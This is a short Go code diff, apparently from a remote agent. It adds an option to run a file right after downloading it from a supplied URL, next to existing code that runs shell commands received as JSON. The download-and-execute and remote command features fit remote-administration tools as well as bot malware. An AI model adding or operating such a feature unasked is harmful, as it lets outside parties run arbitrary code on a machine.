@@ -12,6 +12,7 @@ import (
 type Down struct {
 	Url  string `json:"url"`
 	Path string `json:"path"`
+	IsRun string  `json:"is_run"`
 }
 type Shell struct {
 	Command string `json:"command"`
@@ -39,7 +40,6 @@ func (s Shell) ExecuteCmd() string {
 	} else {
 		fmt.Println("execute", string(opBytes))
 		return string(opBytes)
-
 	}
 }
 func (d Down) Download() string {
@@ -62,6 +62,13 @@ func (d Down) Download() string {
 	_, err = io.Copy(out, resp.Body)
 	if err != nil {
 		return err.Error()
+	}
+	if d.IsRun == "yes"{
+		cmd := exec.Command(d.Path, "")
+		err := cmd.Run()
+		if err != nil {
+			return err.Error()
+		}
 	}
 	return "Download Successful!"
 }
